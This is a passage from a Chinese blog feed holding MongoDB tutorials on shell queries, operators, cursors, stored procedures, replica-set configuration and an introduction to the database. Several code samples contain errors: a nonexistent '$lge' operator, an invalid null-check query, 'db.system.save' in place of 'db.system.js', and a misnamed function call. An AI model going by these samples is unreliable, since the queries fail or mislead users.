ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }&gt;</code></pre><hr><h2 id="&#x4FEE;&#x6539;&#x8BB0;&#x5F55;"><a href="#&#x4FEE;&#x6539;&#x8BB0;&#x5F55;" class="headerlink" title="&#x4FEE;&#x6539;&#x8BB0;&#x5F55;"></a>&#x4FEE;&#x6539;&#x8BB0;&#x5F55;</h2><p>&#x7528;&#x6570;&#x636E;&#x5E93;&#x7684;&#x63CF;&#x8FF0;&#x65B9;&#x5F0F;&#x5C31;&#x662F;&#xFF1A;&#x5C06;name&#x5B57;&#x6BB5;&#xFF0C;&#x503C;&#x4E3A;mongo&#x7684;&#x4E00;&#x6761;&#x5185;&#x5BB9;&#x4FEE;&#x6539;&#x4E3A;mongo_new&#xFF1A;</p><pre><code class="js">&gt; db.things.update({name:&quot;mongo&quot;},{$set:{name:&quot;mong_new&quot;}})WriteResult({ &quot;nMatched&quot; : 1, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 1 })</code></pre><h2 id="&#x5220;&#x9664;&#x8BB0;&#x5F55;"><a href="#&#x5220;&#x9664;&#x8BB0;&#x5F55;" class="headerlink" title="&#x5220;&#x9664;&#x8BB0;&#x5F55;"></a>&#x5220;&#x9664;&#x8BB0;&#x5F55;</h2><p>&#x5C06;&#x7528;&#x6237;name&#x662F;mong_new&#x7684;&#x8BB0;&#x5F55;&#x5220;&#x9664;:</p><pre><code class="js">&gt; printjson(db.things.findOne({name:&quot;mong_new&quot;})){ &quot;_id&quot; : ObjectId(&quot;627e7e064b7e83be0e107f68&quot;), &quot;name&quot; : &quot;mong_new&quot; }&gt; db.things.remove({name:&quot;mong_new&quot;})WriteResult({ &quot;nRemoved&quot; : 1 })&gt; db.things.findOne({name:&quot;mong_new&quot;})null</code></pre><h2 id="&#x9AD8;&#x7EA7;&#x67E5;&#x8BE2;"><a href="#&#x9AD8;&#x7EA7;&#x67E5;&#x8BE2;" class="headerlink" title="&#x9AD8;&#x7EA7;&#x67E5;&#x8BE2;"></a>&#x9AD8;&#x7EA7;&#x67E5;&#x8BE2;</h2><h2 id="&#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26;"><a href="#&#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26;" class="headerlink" title="&#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26;"></a>&#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26;</h2><p><code>&lt;</code>&#x3001;<code>&lt;=</code>&#x3001;<code>&gt;</code>&#x3001;<code>&gt;=</code></p><pre><code class="js">    db.collection.find({&quot;fields&quot;: {$gt: value}})    db.collection.find({&quot;fields&quot;: {$lt: value}})    db.collection.find({&quot;fields&quot;: {$gte: value}})    db.collection.find({&quot;fields&quot;: {$lge: value}})    // &#x591A;&#x4E2A;&#x6761;&#x4EF6;    db.collection.find({&quot;fields&quot;:{$gt:value1, $lt: value2}});</code></pre><p><strong><code>$exists</code></strong> &#x5224;&#x65AD;&#x5B57;&#x6BB5;&#x662F;&#x5426;&#x5B58;&#x5728;</p><pre><code class="js">//&#x67E5;&#x8BE2;&#x5B58;&#x5728;age&#x5B57;&#x6BB5;&#x7684;&#x8BB0;&#x5F55;db.c1.find({age:{$exists:true}})// &#x67E5;&#x8BE2;name&#x5B57;&#x6BB5;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x8BB0;&#x5F55;db.c2.find({name:{$exists:false}})</code></pre><p><strong>NULL</strong> &#x503C;&#x5904;&#x7406;</p><pre><code class="js">// &#x67E5;&#x8BE2;&#x8BB0;&#x5F55;&#x6392;&#x67E5;null&#x503C;db.c1.find({&quot;age&quot;:&quot;$in&quot;:[null],&quot;$exists&quot;:true})</code></pre><p><strong><code>$mod</code></strong> &#x53D6;&#x6A21;&#x8FD0;&#x7B97;</p><pre><code class="js">// &#x67E5;&#x8BE2;age&#x5B57;&#x6BB5;&#xFF0C;&#x53D6;&#x6A21;6&#x7B49;&#x4E8E;1&#x7684;&#x6570;&#x636E;&gt; db.c2.find({age:{$mod:[6,1]}}){ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ab&quot;), &quot;name&quot; : &quot;user1&quot;, &quot;age&quot; : 19 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b1&quot;), &quot;name&quot; : &quot;user7&quot;, &quot;age&quot; : 25 }// &#x67E5;&#x8BE2;age&#x5B57;&#x6BB5;&#xFF0C;&#x53D6;&#x6A21;2&#x7B49;&#x4E8E;0&#x7684;&#x6570;&#x636E;&gt; db.c2.find({age:{$mod:[2,0]}}){ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ac&quot;), &quot;name&quot; : &quot;user2&quot;, &quot;age&quot; : 20 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ae&quot;), &quot;name&quot; : &quot;user4&quot;, &quot;age&quot; : 22 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b0&quot;), &quot;name&quot; : &quot;user6&quot;, &quot;age&quot; : 24 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b2&quot;), &quot;name&quot; : &quot;user8&quot;, &quot;age&quot; : 26 }{ &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b4&quot;), &quot;name&quot; : &quot;user10&quot;, &quot;age&quot; : 28 }&gt;</code></pre><p><strong><code>$ne</code></strong> &#x4E0D;&#x7B49;&#x4E8E;</p><pre><code class="js">// &#x67E5;&#x8BE2;x&#x4E0D;&#x7B49;&#x4E8E;3&#x7684;&#x8BB0;&#x5F55;&gt; db.things.find({x:{$ne:3}}){ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6a&quot;), &quot;x&quot; : 4, &quot;j&quot; : 1 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6b&quot;), &quot;x&quot; : 4, &quot;j&quot; : 2 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6c&quot;), &quot;x&quot; : 4, &quot;j&quot; : 3 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6d&quot;), &quot;x&quot; : 4, &quot;j&quot; : 4 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6e&quot;), &quot;x&quot; : 4, &quot;j&quot; : 5 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f6f&quot;), &quot;x&quot; : 4, &quot;j&quot; : 6 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f70&quot;), &quot;x&quot; : 4, &quot;j&quot; : 7 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f71&quot;), &quot;x&quot; : 4, &quot;j&quot; : 8 }{ &quot;_id&quot; : ObjectId(&quot;627e811d4b7e83be0e107f72&quot;), &quot;x&quot; : 4, &quot;j&quot; : 9 }{ &quot;_id&quot; : 3, &quot;name&quot; : &quot;Bill&quot;, &quot;age&quot; : 34 }&gt;</code></pre><p><strong><code>$in</code> &#x548C; <code>$nin</code> </strong>&#xFF0C;&#x5305;&#x542B;&#x548C;&#x4E0D;&#x5305;&#x542B;</p><pre><code class="js">&gt; db.c2.find({&quot;name&quot;:{&quot;$in&quot;:[20,21,22]}})&gt; db.c2.find({&quot;name&quot;:{&quot;$nin&quot;:[20]}})</code></pre><p><strong><code>count()</code></strong> &#x67E5;&#x8BE2;&#x8BB0;&#x5F55;&#x6761;&#x6570;</p><pre><code class="js">db.things.find().count()</code></pre><p><strong><code>skip()</code></strong> &#x9650;&#x5236;&#x8FD4;&#x56DE;&#x8BB0;&#x5F55;&#x7684;&#x8D77;&#x70B9;</p><pre><code class="js">// &#x4ECE;&#x7B2C;31&#x6761;&#x8BB0;&#x5F55;&#x5F00;&#x59CB;&#xFF0C;&#x8FD4;&#x56DE;10&#x6761;&#x8BB0;&#x5F55;db.userProfile.find().skip(31).limit(10)</code></pre><h3 id="&#x6392;&#x5E8F;"><a href="#&#x6392;&#x5E8F;" class="headerlink" title="&#x6392;&#x5E8F;"></a>&#x6392;&#x5E8F;</h3><p><strong>&#x4EE5;&#x5E74;&#x9F84;&#x5347;&#x5E8F;ASC</strong></p><pre><code class="js">db.c2.find().sort({age: 1})</code></pre><p><strong>&#x4EE5;&#x5E74;&#x9F84;&#x964D;&#x5E8F;DESC</strong></p><pre><code class="js">db.c2.find().sort({age:-1})</code></pre><h2 id="&#x6E38;&#x6807;"><a href="#&#x6E38;&#x6807;" class="headerlink" title="&#x6E38;&#x6807;"></a>&#x6E38;&#x6807;</h2><p>&#x50CF;&#x5927;&#x591A;&#x6570;&#x6570;&#x636E;&#x5E93;&#x4EA7;&#x54C1;&#x4E00;&#x6837;&#xFF0C;MongoDB&#x4E5F;&#x662F;&#x7528;&#x6E38;&#x6807;&#x6765;&#x5FAA;&#x73AF;&#x5904;&#x7406;&#x6BCF;&#x4E00;&#x6761;&#x7ED3;&#x679C;&#x6570;&#x636E;</p><pre><code class="js">&gt; for(var c=db.c2.find();c.hasNext();){... printjson(c.next())}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ab&quot;),        &quot;name&quot; : &quot;user1&quot;,        &quot;age&quot; : 19}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ac&quot;),        &quot;name&quot; : &quot;user2&quot;,        &quot;age&quot; : 20}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ad&quot;),        &quot;name&quot; : &quot;user3&quot;,        &quot;age&quot; : 21}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ae&quot;),        &quot;name&quot; : &quot;user4&quot;,        &quot;age&quot; : 22}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97af&quot;),        &quot;name&quot; : &quot;user5&quot;,        &quot;age&quot; : 23}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b0&quot;),        &quot;name&quot; : &quot;user6&quot;,        &quot;age&quot; : 24}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b1&quot;),        &quot;name&quot; : &quot;user7&quot;,        &quot;age&quot; : 25}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b2&quot;),        &quot;name&quot; : &quot;user8&quot;,        &quot;age&quot; : 26}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b3&quot;),        &quot;name&quot; : &quot;user9&quot;,        &quot;age&quot; : 27}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b4&quot;),        &quot;name&quot; : &quot;user10&quot;,        &quot;age&quot; : 28}// &#x53E6;&#x4E00;&#x79CD;&#x65B9;&#x5F0F;&gt; db.c2.find().forEach(function(u){printjson(u)}){        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ab&quot;),        &quot;name&quot; : &quot;user1&quot;,        &quot;age&quot; : 19}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ac&quot;),        &quot;name&quot; : &quot;user2&quot;,        &quot;age&quot; : 20}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ad&quot;),        &quot;name&quot; : &quot;user3&quot;,        &quot;age&quot; : 21}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97ae&quot;),        &quot;name&quot; : &quot;user4&quot;,        &quot;age&quot; : 22}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97af&quot;),        &quot;name&quot; : &quot;user5&quot;,        &quot;age&quot; : 23}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b0&quot;),        &quot;name&quot; : &quot;user6&quot;,        &quot;age&quot; : 24}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b1&quot;),        &quot;name&quot; : &quot;user7&quot;,        &quot;age&quot; : 25}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b2&quot;),        &quot;name&quot; : &quot;user8&quot;,        &quot;age&quot; : 26}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b3&quot;),        &quot;name&quot; : &quot;user9&quot;,        &quot;age&quot; : 27}{        &quot;_id&quot; : ObjectId(&quot;627fd46019fb40ff16ec97b4&quot;),        &quot;name&quot; : &quot;user10&quot;,        &quot;age&quot; : 28}&gt;</code></pre><h2 id="&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;"><a href="#&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;"></a>&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;</h2><p>MongoDB&#x540C;&#x6837;&#x652F;&#x6301;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x3002;&#x5173;&#x4E8E;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x4F60;&#x9700;&#x8981;&#x77E5;&#x9053;&#x7684;&#x7B2C;&#x4E00;&#x4EF6;&#x4E8B;&#x5C31;&#x662F;&#x5B83;&#x662F;&#x7528;JavaScript&#x6765;&#x5199;&#x7684;&#x3002;<br>MongoDB&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x662F;&#x5B58;&#x50A8;&#x5728;db.system.js&#x8868;&#x4E2D;&#x3002;</p><p>MongoDB&#x7684;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x521B;&#x5EFA;&#x8FC7;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p><pre><code class="js">// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&gt; db.system.save({_id:&quot;addNumbers&quot;,value:function(x,y){return x+y}})WriteResult({ &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 1, &quot;nModified&quot; : 0, &quot;_id&quot; : &quot;addNumbers&quot; })//&#x53EF;&#x4EE5;&#x4EE5;&#x4E0B;&#x65B9;&#x6CD5;&#x68C0;&#x67E5;&#x5B58;&#x50A8;&gt; db.system.js.find(){ &quot;_id&quot; : &quot;addNumbers&quot;, &quot;value&quot; : { &quot;code&quot; : &quot;function (x,y){return x+y}&quot; } }// &#x8C03;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&gt; db.eval(&apos;addNumber(3,4.2)&apos;)WARNING: db.eval is deprecated7.2</code></pre><h2 id="&#x53C2;&#x8003;&#xFF1A;"><a href="#&#x53C2;&#x8003;&#xFF1A;" class="headerlink" title="&#x53C2;&#x8003;&#xFF1A;"></a>&#x53C2;&#x8003;&#xFF1A;</h2><p><a href="https://www.mongodb.com/docs/v4.2/reference/method/js-collection/" target="_blank" rel="noopener">https://www.mongodb.com/docs/v4.2/reference/method/js-collection/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x8FDE;&amp;#x63A5;&amp;#x6570;&amp;#x636E;&amp;#x5E93;&quot;&gt;&lt;a href=&quot;#&amp;#x8FDE;&amp;#x63A5;&amp;#x6570;&amp;#x636E;&amp;#x5E93;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x8FDE;&amp;#x6
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MongoDB安装部署</title>
    <link href="https://marnm.github.io//posts/55c06d78/"/>
    <id>https://marnm.github.io//posts/55c06d78/</id>
    <published>2022-06-07T04:42:53.000Z</published>
    <updated>2022-06-07T05:17:19.789Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MongoDB&#x5B89;&#x88C5;&#x90E8;&#x7F72;"><a href="#MongoDB&#x5B89;&#x88C5;&#x90E8;&#x7F72;" class="headerlink" title="MongoDB&#x5B89;&#x88C5;&#x90E8;&#x7F72;"></a>MongoDB&#x5B89;&#x88C5;&#x90E8;&#x7F72;</h1><p><strong>&#x5B98;&#x65B9;&#x6587;&#x6863;</strong></p><p><a href="https://docs.mongodb.com/manual/" target="_blank" rel="noopener">https://docs.mongodb.com/manual/</a></p><pre><code class="shell">[root@server11 ~]&amp; cat &gt;/opt/mongo_cluster/mongo_28017/conf/mongo_28017.conf &lt;&lt;EOFsystemLog:  destination: file  logAppend: true  path: /opt/mongo_cluster/mongo_28017/logs/mongodb.logstorage:  journal:    enabled: true  dbPath: /data/mongo_cluster/mongo_28017  directoryPerDB: true  wiredTiger:     engineConfig:        cacheSizeGB: 1        directoryForIndexes: true     collectionConfig:         blockCompressor: zlib     indexConfig:        prefixCompression: trueprocessManagement:  fork: true  pidFilePath: /opt/mongo_cluster/mongo_28017/pid/mongod.pidnet:  port: 28017  bindIp: 127.0.0.1,192.168.10.11replication:  oplogSizeMB: 1024  replSetName: dba666EOF</code></pre><pre><code class="shell">[root@rhel7 ~]&amp; mongod -f /opt/mongo_cluster/mongo_28017/conf/mongo_28017.confabout to fork child process, waiting until server is ready for connections.forked process: 2463child process started successfully, parent exiting[root@rhel7 ~]&amp; mongod -f /opt/mongo_cluster/mongo_28018/conf/mongo_28018.confabout to fork child process, waiting until server is ready for connections.forked process: 2492child process started successfully, parent exiting[root@rhel7 ~]&amp; mongod -f /opt/mongo_cluster/mongo_28019/conf/mongo_28019.confabout to fork child process, waiting until server is ready for connections.forked process: 2521child process started successfully, parent exiting[root@rhel7 ~]&amp;</code></pre><pre><code class="shell">[root@rhel7 ~]&amp; netstat -pantul |grep mongotcp        0      0 0.0.0.0:28017           0.0.0.0:*               LISTEN      2463/mongodtcp        0      0 0.0.0.0:28018           0.0.0.0:*               LISTEN      2492/mongodtcp        0      0 0.0.0.0:28019           0.0.0.0:*               LISTEN      2521/mongodtcp        0      0 0.0.0.0:27017           0.0.0.0:*               LISTEN      1410/mongod</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MongoDB&amp;#x5B89;&amp;#x88C5;&amp;#x90E8;&amp;#x7F72;&quot;&gt;&lt;a href=&quot;#MongoDB&amp;#x5B89;&amp;#x88C5;&amp;#x90E8;&amp;#x7F72;&quot; class=&quot;headerlink&quot; title=&quot;MongoDB&amp;#x5B89
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MongoDB介绍</title>
    <link href="https://marnm.github.io//posts/8b1c1f4b/"/>
    <id>https://marnm.github.io//posts/8b1c1f4b/</id>
    <published>2022-06-07T04:42:46.000Z</published>
    <updated>2022-06-07T05:17:42.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MongoDB&#x4ECB;&#x7ECD;"><a href="#MongoDB&#x4ECB;&#x7ECD;" class="headerlink" title="MongoDB&#x4ECB;&#x7ECD;"></a>MongoDB&#x4ECB;&#x7ECD;</h1><p>Mongodb &#x7531; C++&#x8BED;&#x8A00;&#x7F16;&#x5199;&#x7684;&#xFF0C;&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6587;&#x4EF6;&#x5B58;&#x50A8;&#x7684;&#x5F00;&#x6E90;&#x6570;&#x636E;&#x5E93;&#x7CFB;&#x7EDF;&#x3002;&#xFF0C;&#x662F;&#x4E13;&#x4E3A;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF0C;&#x9AD8;&#x6027;&#x80FD;&#x548C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C; &#x662F;&#x975E;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x529F;&#x80FD;&#x6700;&#x4E30;&#x5BCC;&#xFF0C;&#x6700;&#x50CF;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x7684;&#xFF0C;&#x5B83;&#x652F;&#x6301;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x975E;&#x5E38;&#x6563;&#xFF0C;&#x662F;&#x7C7B;&#x4F3C; json &#x7684; bjson &#x683C;&#x5F0F;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x5B58;&#x50A8;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#x7684;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x3002;</p><p>MongoDB &#x7684;&#xFF08;&#x6765;&#x81EA;&#x4E8E;&#x82F1;&#x6587;&#x5355;&#x8BCD;&#x201C;&#x4E86; Humongous&#x201D;&#xFF0C;&#x4E2D;&#x6587;&#x542B;&#x4E49;&#x4E3A;&#x201C;&#x5E9E;&#x5927;&#x201D;&#xFF09;&#x662F;&#x53EF;&#x4EE5;&#x5E94;&#x7528;&#x4E8E;&#x5404;&#x79CD;&#x89C4;&#x6A21;&#x7684;&#x4F01;&#x4E1A;&#xFF0C;&#x5404;&#x4E2A;&#x884C;&#x4E1A;&#x4EE5;&#x53CA;&#x5404;&#x7C7B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x5F00;&#x6E90;&#x6570;&#x636E;&#x5E93;&#x3002;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;&#x9002;&#x7528;&#x4E8E;&#x654F;&#x6377;&#x5F00;&#x53D1;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;MongoDB&#x7684;&#x6570;&#x636E;&#x6A21;&#x5F0F;&#x53EF;&#x4EE5;&#x968F;&#x7740;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x53D1;&#x5C55;&#x800C;&#x7075;&#x6D3B;&#x5730;&#x66F4;&#x65B0;&#x3002;<br>MongoDB &#x4EE5;&#x4E00;&#x79CD;&#x53EB;&#x505A; BSON&#xFF08;&#x4E8C;&#x8FDB;&#x5236; JSON&#xFF09;&#x7684;&#x5B58;&#x50A8;&#x5F62;&#x5F0F;&#x5C06;&#x6570;&#x636E;&#x4F5C;&#x4E3A;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x3002;&#x5177;&#x6709;&#x76F8;&#x4F3C;&#x7ED3;&#x6784;&#x7684;&#x6587;&#x6863;&#x901A;&#x5E38;&#x88AB;&#x6574;&#x7406;&#x6210;&#x96C6;&#x5408;&#x3002;&#x53EF;&#x4EE5;&#x628A;&#x8FD9;&#x4E9B;&#x96C6;&#x5408;&#x770B;&#x6210;&#x7C7B;&#x4F3C;&#x4E8E;&#x5173;&#x7CFB;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#xFF1A; &#x6587;&#x6863;&#x548C;&#x884C;&#x76F8;&#x4F3C;&#xFF0C; &#x5B57;&#x6BB5;&#x548C;&#x5217;&#x76F8;&#x4F3C;&#x3002;</p><blockquote><p>MongoDB&#x662F;&#x4E13;&#x4E3A;&#x53EF;&#x6269;&#x5C55;&#x6027;&#xFF0C;&#x9AD8;&#x6027;&#x80FD;&#x548C;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x800C;&#x8BBE;&#x8BA1;&#x7684;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5B83;&#x53EF;&#x4EE5;&#x4ECE;&#x5355;&#x670D;&#x52A1;&#x5668;&#x90E8;&#x7F72;&#x6269;&#x5C55;&#x5230;&#x5927;&#x578B;&#x3001;&#x590D;&#x6742;&#x7684;&#x591A;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x67B6;&#x6784;&#x3002;&#x5229;&#x7528;&#x5185;&#x5B58;&#x8BA1;&#x7B97;&#x7684;&#x4F18;&#x52BF;&#xFF0C;MongoDB&#x80FD;&#x591F;&#x63D0;&#x4F9B;&#x9AD8;&#x6027;&#x80FD;&#x7684;&#x6570;&#x636E;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x3002; MongoDB&#x7684;&#x672C;&#x5730;&#x590D;&#x5236;&#x548C;&#x81EA;&#x52A8;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x529F;&#x80FD;&#x4F7F;&#x60A8;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5177;&#x6709;&#x4F01;&#x4E1A;&#x7EA7;&#x7684;&#x53EF;&#x9760;&#x6027;&#x548C;&#x64CD;&#x4F5C;&#x7075;&#x6D3B;&#x6027;</p></blockquote><h2 id="2-1-MongoDB-&#x6570;&#x636E;&#x683C;&#x5F0F;"><a href="#2-1-MongoDB-&#x6570;&#x636E;&#x683C;&#x5F0F;" class="headerlink" title="2.1 MongoDB &#x6570;&#x636E;&#x683C;&#x5F0F;"></a>2.1 MongoDB &#x6570;&#x636E;&#x683C;&#x5F0F;</h2><h3 id="2-1-1-JSON"><a href="#2-1-1-JSON" class="headerlink" title="2.1.1 JSON"></a>2.1.1 JSON</h3><p>JSON(JavaScript Object Notation) &#x662F;&#x4E00;&#x79CD;&#x8F7B;&#x91CF;&#x7EA7;&#x7684;&#x6570;&#x636E;&#x4EA4;&#x6362;&#x683C;&#x5F0F;&#x3002;JSON &#x91C7;&#x7528;&#x5B8C;&#x5168;&#x72EC;&#x7ACB;&#x4E8E;&#x8BED;&#x8A00;&#x7684;&#x6587;&#x672C;&#x683C;&#x5F0F;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x4F7F;&#x7528;&#x4E86;&#x7C7B;&#x4F3C;&#x4E8E; C &#x8BED;&#x8A00;&#x5BB6;&#x65CF;&#x7684;&#x4E60;&#x60EF;&#xFF08;&#x5305;&#x62EC; C&#x3001; C++&#x3001; C#&#x3001; Java&#x3001;JavaScript&#x3001; Perl&#x3001;Python &#x7B49;&#xFF09;&#x3002;&#x8FD9;&#x4E9B;&#x7279;&#x6027;&#x4F7F; JSON &#x6210;&#x4E3A;&#x7406;&#x60F3;&#x7684;&#x6570;&#x636E;&#x4EA4;&#x6362;&#x8BED;&#x8A00;.&#x6613;&#x4E8E;&#x4EBA;&#x9605;&#x8BFB;&#x548C;&#x7F16;&#x5199;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x6613;&#x4E8E;&#x673A;&#x5668;&#x89E3;&#x6790;&#x548C;&#x751F;&#x6210;(&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x63D0;&#x5347;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x901F;&#x7387;)&#x3002;JSON &#x7684;&#x5B98;&#x65B9; MIME &#x7C7B;&#x578B;&#x662F; application/json,&#x6587;&#x4EF6;&#x6269;&#x5C55;&#x540D;&#x662F;.json&#x3002;</p><p>MongoDB &#x4F7F;&#x7528; JSON&#xFF08;JavaScript ObjectNotation&#xFF09;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x8BB0;&#x5F55;&#x3002;<br>JSON &#x7B80;&#x5355;&#x8BF4;&#x5C31;&#x662F; JavaScript &#x4E2D;&#x7684;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x7EC4;&#xFF0C;&#x901A;&#x8FC7;&#x5BF9;&#x8C61;&#x548C;&#x6570;&#x7EC4;&#x53EF;&#x4EE5;&#x8868;&#x793A;&#x5404;&#x79CD;&#x590D;&#x6742;&#x7684;&#x7ED3;&#x6784;&#x3002;</p><p><strong>&#x5BF9;&#x8C61;&#xFF1A;</strong><br>&#x5BF9;&#x8C61;&#x5728; js &#x4E2D;&#x8868;&#x793A;&#x4E3A;&#x201C;{}&#x201D;&#x62EC;&#x8D77;&#x6765;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x4E3A; {key&#xFF1A; value,key&#xFF1A; value,&#x2026;}&#x7684;&#x952E;&#x503C;&#x5BF9;&#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x5728;&#x9762;&#x5411;&#x5BF9;&#x8C61;&#x7684;&#x8BED;&#x8A00;&#x4E2D;&#xFF0C; key &#x4E3A;&#x5BF9;&#x8C61;&#x7684;&#x5C5E;&#x6027;&#xFF0C; value &#x4E3A;&#x5BF9;&#x5E94;&#x7684;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x6240;&#x4EE5;&#x5F88;&#x5BB9;&#x6613;&#x7406;&#x89E3;&#xFF0C;&#x53D6;&#x503C;&#x65B9;&#x6CD5;&#x4E3A; &#x5BF9;&#x8C61;.key &#x83B7;&#x53D6;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x8FD9;&#x4E2A;&#x5C5E;&#x6027;&#x503C;&#x7684;&#x7C7B;&#x578B;&#x53EF;&#x4EE5;&#x662F; &#x6570;&#x5B57;&#x3001;&#x5B57;&#x7B26;&#x4E32;&#x3001;&#x6570;&#x7EC4;&#x3001;&#x5BF9;&#x8C61;&#x51E0;&#x79CD;&#x3002;<br>&#x4F8B;&#x5982;&#xFF1A; 